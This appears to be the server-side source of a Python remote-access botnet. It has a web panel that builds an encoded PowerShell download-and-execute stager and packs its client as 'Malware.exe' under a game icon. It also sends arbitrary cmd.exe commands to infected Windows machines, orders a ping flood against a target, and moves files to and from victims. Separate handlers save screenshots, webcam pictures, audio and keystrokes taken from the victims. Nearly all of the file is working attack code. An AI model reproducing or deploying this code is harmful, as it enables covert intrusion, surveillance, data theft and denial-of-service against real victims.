#Server.py

from flask import Flask, request, render_template, redirect, url_for, session, jsonify
from flask_socketio import SocketIO
import os, subprocess, base64

app = Flask(__name__)
server = SocketIO(app)
app.secret_key = 'Fixer'

USERNAME = 'admin'
PASSWORD = 'admin9876'
server_ip = '0.0.0.0'
server_port = 8000

idNumber = 0
database = []
completedTasks = []
command_output = 'COMMAND OUTPUT'
ping_output_list = []
file_transfer_list = []

class Client:
    def __init__(self, info):
        global idNumber
        self.idNumber = idNumber
        idNumber += 1
        self.persistence = False
        self.IP = info['IP']
        self.hostname = info['hostname']
        self.OS = info['OS']
        self.sid = info['sid']
        self.status = "Alive"

@app.route('/')
def redirectLogin():
    return redirect(url_for('login'))

@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form.get('userid')
        password = request.form.get('passid')
        if username == USERNAME and password == PASSWORD:
            session['loggedin'] = True
            session['username'] = USERNAME
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html')
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if session.get('loggedin'):
        return render_template('dashboard.html', database=database)
    return redirect(url_for('login'))

@app.route('/payload', methods=['GET'])
def payload():
    payload_ip = request.args.get('serverIP')
    payload_port = request.args.get('port')
    force_convert = request.args.get('forceConvert', False)
    if force_convert != 'on':
        initial_string = rf'$url = "http://{payload_ip}:{payload_port}/Client.py"; $destination = "C:\Program Files\WindowsPowerShell\Malware.py"; Invoke-WebRequest -Uri $url -OutFile $destination; Start-Process -FilePath $destination'
        payload_string = base64.b64encode(initial_string.encode()).decode()
        return render_template('payload.html', string=payload_string)
    else:
        status = pytoexe()
        if status:
            initial_string = rf'$url = "http://{payload_ip}:{payload_port}/build/dist/Client.py"; $destination = "C:\Program Files\WindowsPowerShell\Malware.exe"; Invoke-WebRequest -Uri $url -OutFile $destination; Start-Process -FilePath $destination'
            payload_string = base64.b64encode(initial_string.encode()).decode()
            return render_template('payload.html', string=payload_string)
        else:
            payload_string = 'Payload String Could not be Generated'
            return render_template('payload.html', string=payload_string)

def pytoexe():
    command = ['C:/Python3x/Scripts/pyinstaller.exe', '--name', 'Malware', '--icon=./static/GTA6.ico', '--distpath=build/dist', '--verbose', 'Client.py']
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return process.returncode == 0

@app.route('/modules', methods=['GET', 'POST'])
def modules():
    if not session.get('loggedin'):
        return redirect(url_for('login'))
    if request.method == 'POST':
        idNumber = request.form.get('idNumber')
        command = request.form.get('command')

        if idNumber:
            client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
            if client_info:
                hostname = client_info.hostname
            else:
                return "ERROR: BOT with Provided BOT-ID not Found"
            server.emit('module', {'idNumber': idNumber, 'command': command, 'hostname': hostname})
            return render_template('modules.html', tasks=completedTasks)
        else:
            return "ERROR : Bot ID not provided"

    return render_template('modules.html', tasks=completedTasks)

@server.on('module_output')
def handle_modules_output(module_output):
    idNumber = module_output.get('idNumber')
    command = module_output.get('command')
    hostname = module_output.get('hostname')
    status = module_output.get('result')
    completedTasks.append({'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': status})

@app.route('/commands', methods=['GET'])
def commands():
    if not session.get('loggedin'):
        return redirect(url_for('login'))

    idNumber = request.args.get('idNumber')
    command = request.args.get('command')

    if idNumber and command:
        client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
        if client_info:
            hostname = client_info.hostname
            send_commands(idNumber, command, hostname)
            global command_output
            return render_template('commands.html', commands_output=command_output)
        else:
            return jsonify({'ERROR': 'BOT with provided BOT-ID not found'}), 404
    else:
        return render_template('commands.html', commands_output='')

def send_commands(idNumber, command, hostname):
    client = next((c for c in database if c.idNumber == int(idNumber)), None)
    if not client:
        return f"ERROR : Bot with BOT-ID {idNumber} not found"
    else:
        command = f"cmd.exe /C {command}"
        server.emit('commands', {'idNumber': idNumber, 'command': command, 'hostname': hostname})

@server.on('commands_output')
def handle_commands_output(commands_output):
    global command_output
    command_output = commands_output.get('output')

@app.route('/ping', methods=['GET'])
def ping():
    ip_address = request.args.get('target_ip')
    if ip_address:
        send_ping(ip_address)
        global ping_output_list
        return render_template('ping.html', output=ping_output_list)
    return render_template('ping.html')

def send_ping(ip_address):
    for client in database:
        idNumber = client.idNumber
        command = f'ping {ip_address} -t -l 65500'
        server.emit('ping', {'idNumber': idNumber, 'ip_address' : ip_address, 'command': command})

@server.on('ping_output')
def handle_ping_output(ping_output):
    idNumber = ping_output.get('idNumber')
    output = ping_output.get('output')
    client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
    if client_info:
        hostname = client_info.hostname
        ping_output_list.append({'idNumber': idNumber, 'hostname': hostname, 'output': output})

@app.route('/file_transfer', methods=['GET'])
def file_transfer():
    if not session.get('loggedin'):
        return redirect(url_for('login'))
    
    transfer_type = request.args.get('transferType')
    idNumber = request.args.get('idNumber')
    file_name = request.args.get('fileName')
    if idNumber is not None:
        client_info = next((client for client in database if client.idNumber == int(idNumber)), None)
        if client_info:
            hostname = client_info.hostname
    if transfer_type == 'upload':
        with open(f'{file_name}', 'rb') as file:
            file_data = file.read()
            server.emit('upload', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'file_data' : file_data})
        return render_template('file_transfer.html', transfer=file_transfer_list)
    elif transfer_type == 'download':
        server.emit('download', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name})
        return render_template('file_transfer.html', transfer=file_transfer_list)
    return render_template('file_transfer.html', transfer=file_transfer_list)

@server.on('file_status')
def file_status_update(file_status):
    idNumber = file_status.get('idNumber')
    transfer_type = file_status.get('transfer_type')
    hostname = file_status.get('hostname')
    file_name = file_status.get('file_name')
    status = file_status.get('status')
    file_transfer_list.append({'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})

@server.on('download_from_client')
def download(input):
    idNumber = input.get('idNumber')
    transfer_type = input.get('transfer_type')
    hostname = input.get('hostname')
    file_name = input.get('file_name')
    file_data = input.get('file_data')
    file_path = "./Data/Files/" + file_name
    if transfer_type == 'download':
        try:
            with open(file_path, 'wb') as file:
                file.write(file_data)
                status = "File Has Been Downloaded SuccessFully from the Client"
                file_transfer_list.append({'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
        except:
            status = "File Could not be Written on the Server"
            file_transfer_list.append({'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})

@server.on('module_file')
def module_file_transfer(input):
    command = input.get('command')
    file_name = input.get('file_name')
    file_data = input.get('file_data')
    if command == 'screenshot':
        file_path = "./Data/Screenshots/" + file_name
        with open(file_path, 'wb') as file:
            file.write(file_data)
    elif command == 'picture':
        file_path = "./Data/Pictures/" + file_name
        with open(file_path, 'wb') as file:
            file.write(file_data)
    elif command == 'audio':
        file_path = "./Data/Audios/" + file_name
        with open(file_path, 'wb') as file:
            file.write(file_data)

@server.on('keylogs')
def keylogs_saver(input):
    hostname = input.get('hostname')
    key = input.get('key')
    filename = f"./Data/Keylogs/{hostname}_keylogs.txt"
    if not os.path.exists(filename):
        open(filename, 'a+').close()
    if key is not None:
        with open(filename, 'a') as logkey:
            logkey.write(key)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@server.on('connect')
def onConnect():
    print(f'CLIENT {idNumber} JUST CONNECTED TO THE SERVER 🟩')

@server.on('disconnect')
def onDisconnect():
    print(f'CLIENT {idNumber} DISCONNECTED FROM THE SERVER 🟥')

@server.on('Initial_Information')
def handleInformation(Initial_Information):
        database.append(Client(Initial_Information))

if __name__ == '__main__':
    server.run(app, host=server_ip, port=server_port)
